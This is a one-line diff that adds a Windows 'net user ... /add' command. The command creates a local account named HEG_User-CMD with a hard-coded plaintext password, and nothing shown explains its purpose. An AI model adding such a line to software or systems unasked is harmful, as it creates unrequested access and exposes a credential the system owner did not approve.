@@ -1,0 +1,1 @@
+net user HEG_User-CMD x^Bu4SV*3e$n /add 
